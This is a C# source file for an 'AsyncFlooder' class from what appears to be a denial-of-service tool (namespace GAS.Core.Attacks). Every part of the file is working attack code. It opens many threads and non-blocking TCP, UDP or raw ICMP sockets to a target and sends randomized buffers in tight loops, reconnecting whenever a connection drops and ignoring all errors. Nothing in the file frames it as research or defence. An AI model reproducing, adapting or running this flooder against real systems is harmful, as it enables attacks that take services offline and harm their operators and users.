using System;
using System.Net.Sockets;
using System.Threading;
using GAS.Core.AttackInformation;
namespace GAS.Core.Attacks {
    public class AsyncFlooder {
        public int ThreadCount { get; private set; }
        public AttackInfo Info { get; private set; }
        private bool _isAttacking;
        public bool IsAttacking {
            get { return this._isAttacking; }
        }

        private Socket[] _workingSocket;
        private Thread[] _workingThreads;
        private SocketAsyncEventArgs[] _connectArgs;
        private SocketAsyncEventArgs[] _sendArgs;
        private SocketAsyncEventArgs[] _recvArgs;
        private EventHandler<SocketAsyncEventArgs> _fSend;
        private EventHandler<SocketAsyncEventArgs> _fConn;
        private EventHandler<SocketAsyncEventArgs> _fRecv;
        private byte[][] _buffers;
        private ulong[] _sendLast;
        private ulong[] _recvLast;

        private static SocketAsyncEventArgs DeafultSocketArgrs() {
            return new SocketAsyncEventArgs {
                DisconnectReuseSocket = true,
                SocketFlags = SocketFlags.None
            };
        }

        private void UpdateConnectArgs( int i, AttackInfo info ) {
            this._connectArgs[ i ].RemoteEndPoint = info.Target;
        }

        public AsyncFlooder( AttackInfo info, int threadCount = 1 ) {
            this.Info = info;
            this.ThreadCount = threadCount;
            this._buffers = new byte[ this.ThreadCount ][];
            this._connectArgs = new SocketAsyncEventArgs[ this.ThreadCount ];
            this._fConn = ( a, b ) => this.LoopExec( (Socket) a, b, this.ConnectedWorker, this.SentWorker, this.ReceivedWorker );
            this._fSend = ( a, b ) => this.LoopExec( (Socket) a, b, this.SentWorker, this.ReceivedWorker );
            this._fRecv = ( a, b ) => this.LoopExec( (Socket) a, b, this.ReceivedWorker );
            this._recvArgs = new SocketAsyncEventArgs[ this.ThreadCount ];
            this._recvLast = new ulong[ this.ThreadCount ];
            this._sendArgs = new SocketAsyncEventArgs[ this.ThreadCount ];
            this._sendLast = new ulong[ this.ThreadCount ];
            this._workingSocket = new Socket[ this.ThreadCount ];
            this._workingThreads = new Thread[ this.ThreadCount ];
            for ( var i = 0; i < this.ThreadCount; i++ )
                this._buffers[ i ] = new byte[ info.bufferSize ];
        }

        public void Start() {
            lock ( this ) {
                if ( this._isAttacking ) this.Stop();
                this._isAttacking = true;
            }
            for ( var i = 0; i < this.ThreadCount; i++ ) {
                var b = i;
                ( this._workingThreads[ i ] = new Thread( () => this.Attack( b ) ) ).Start();
            }
        }

        public void Stop() {
            lock ( this ) {
                if ( !this._isAttacking ) return;
                this._isAttacking = false;
            }
        }

        private void Attack( int i ) {
            try {
                this._workingSocket[ i ] = CreateSocket();
                this._connectArgs[ i ] = DeafultSocketArgrs();
                this._recvArgs[ i ] = DeafultSocketArgrs();
                this._sendArgs[ i ] = DeafultSocketArgrs();

                this.UpdateConnectArgs( i, this.Info );

                this._connectArgs[ i ].Completed += this._fConn;
                this._connectArgs[ i ].UserToken = i;
                this._recvArgs[ i ].Completed += this._fRecv;
                this._recvArgs[ i ].UserToken = i;
                this._sendArgs[ i ].Completed += this._fSend;
                this._sendArgs[ i ].UserToken = i;
                
                while ( this._isAttacking ) {
                    if ( this.SocketConnect( i ) ) return;
                    this._fConn(this._workingSocket[ i ], this._connectArgs[ i ]);
                }
            }
            catch { }
        }

        private bool ConnectedWorker( Socket s, SocketAsyncEventArgs b ) {
            var index = (int) b.UserToken;
            if ( !this._isAttacking || this._sendLast[ index ]-- <= 0UL ) return true;
            this.RefreshSendData( index );
            if ( s.SendAsync( this._sendArgs[ index ] ) ) return true;
            this._fSend( s, this._sendArgs[ index ] );
            return false;
        }

        private bool SentWorker( Socket s, SocketAsyncEventArgs b ) {
            var index = (int) b.UserToken;
            while ( this._isAttacking
                && this._sendLast[ index ]-- > 0
                && b.SocketError == SocketError.Success
                && ( s.SocketType != SocketType.Stream || s.Connected ) )
                try {
                    this.RefreshSendData( index );
                    if ( s.SendAsync( this._sendArgs[ index ] ) ) return true;
                }
                catch { }
            return !this._isAttacking && b.SocketError == SocketError.Success;
        }

        private bool ReceivedWorker( Socket s, SocketAsyncEventArgs b ) {
            var index = (int) b.UserToken;
            if ( s.SocketType != SocketType.Stream ) return false;
            while ( this._isAttacking
                && this._recvLast[ index ]-- > 0
                && b.SocketError == SocketError.Success
                && ( s.SocketType != SocketType.Stream || s.Connected ) )
                try {
                    if ( s.ReceiveAsync( this._recvArgs[ index ] ) ) return true;
                }
                catch { }
            return !this._isAttacking && b.SocketError == SocketError.Success;
        }

        private void LoopExec( Socket s, SocketAsyncEventArgs b, params Func<Socket, SocketAsyncEventArgs, bool>[] runs ) {
            var index = (int) b.UserToken;
            while ( this._isAttacking )
                try {
                    if ( s.SocketType == SocketType.Stream && !s.Connected ) {
                        if ( this.SocketConnect( index ) ) return;
                        s = this._workingSocket[ index ];
                    }
                    foreach (var run in runs)
                        if ( run( s, b ) ) return;
                }
                catch { }
        }

        private bool SocketConnect( int index ) {
            this._workingSocket[ index ].Dispose();
            this._workingSocket[ index ] = CreateSocket();
            _sendLast[ index ] = this.Info.MaxWrite;
            _recvLast[ index ] = this.Info.MaxRead;
            var ws = this._workingSocket[ index ];
            if ( ws.SocketType != SocketType.Stream )
                return false;
            while ( this._isAttacking && !ws.Connected )
                try {
                    if ( ws.ConnectAsync( this._connectArgs[ index ] ) ) return true;
                }
                catch { }
            return false;
        }
        
        private void RefreshSendData( int i ) {
            var b = this._buffers[ i ];
            this._sendArgs[ i ].SetBuffer( b, 0, Info.Randomizer( b ) );
        }

        private Socket CreateSocket() {
            SocketType st;
            switch ( this.Info.Protocol ) {
                case ProtocolType.Icmp:
                case ProtocolType.Igmp:
                case ProtocolType.Raw:
                case ProtocolType.IcmpV6:
                    st = SocketType.Raw;
                    break;
                case ProtocolType.Tcp:
                    st = SocketType.Stream;
                    break;
                case ProtocolType.Udp:
                    st = SocketType.Dgram;
                    break;
                default:
                    throw new ArgumentOutOfRangeException();
            }
            return new Socket( AddressFamily.InterNetwork, st, this.Info.Protocol ) { Blocking =  false };
        }
    }
}